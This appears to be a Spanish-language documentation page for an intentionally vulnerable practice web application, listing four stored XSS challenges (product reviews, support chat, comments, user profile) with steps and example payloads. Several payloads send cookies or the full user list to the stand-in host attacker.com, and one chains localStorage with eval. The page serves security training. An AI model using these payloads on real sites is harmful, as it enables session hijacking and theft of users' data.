---
layout: default
title: Cross-Site Scripting (XSS)
nav_order: 4
parent: Vulnerabilidades
---

# Cross-Site Scripting (XSS)

## 4.1 XSS en Sistema de Reseñas
- **Ubicación**: `/api/v1/products/{id}/reviews`
- **Descripción**: Sistema de reseñas permite inyección de HTML/JavaScript
- **Pasos**:
  1. Acceder a un producto
  2. Agregar una reseña con código malicioso
  3. La reseña se renderiza sin sanitización
- **Payloads de ejemplo**:
  ```javascript
  <script>alert(document.cookie)</script>
  <img src=x onerror="fetch('http://attacker.com/'+document.cookie)">
  <svg onload="alert(1)">
  ```
- **Criterio de éxito**: Script ejecutado al ver la reseña
- **Impacto**: Robo de sesión, defacement, robo de datos

## 4.2 XSS en Chat de Soporte
- **Ubicación**: `/support`
- **Descripción**: Chat de soporte vulnerable a XSS
- **Pasos**:
  1. Acceder al chat de soporte
  2. Enviar mensaje con payload XSS
  3. El mensaje se renderiza sin sanitización
- **Payloads de ejemplo**:
  ```javascript
  <script>localStorage.setItem('chatScript', 'alert(1)')</script>
  <img src=x onerror="eval(localStorage.getItem('chatScript'))">
  ```
- **Criterio de éxito**: Script ejecutado en el chat
- **Impacto**: Ejecución de código arbitrario, robo de datos

## 4.3 XSS en Comentarios de Productos
- **Ubicación**: `/api/v1/products/{id}/comments`
- **Descripción**: Comentarios sin sanitizar permiten XSS
- **Pasos**:
  1. Agregar comentario en producto
  2. Insertar payload XSS
- **Payloads de ejemplo**:
  ```javascript
  <script>alert(document.cookie)</script>
  <img src=x onerror="fetch('http://attacker.com/'+document.cookie)">
  <svg onload="alert(1)">
  ```
- **Criterio de éxito**: Script ejecutado al ver comentario
- **Impacto**: Robo de sesión, defacement

## 4.4 XSS en Perfil de Usuario
- **Ubicación**: `/api/v1/users/profile`
- **Descripción**: Campos de perfil permiten HTML/JavaScript
- **Pasos**:
  1. Editar perfil
  2. Insertar payload en campos de perfil
  3. El perfil se renderiza sin sanitización
- **Payloads de ejemplo**:
  ```javascript
  <script>document.location='http://attacker.com/'+document.cookie</script>
  <img src=x onerror="fetch('/api/v1/users').then(r=>r.json()).then(d=>fetch('http://attacker.com/'+btoa(JSON.stringify(d))))">
  ```
- **Criterio de éxito**: HTML/JavaScript ejecutado en perfil
- **Impacto**: Ataque a otros usuarios, robo de datos sensibles
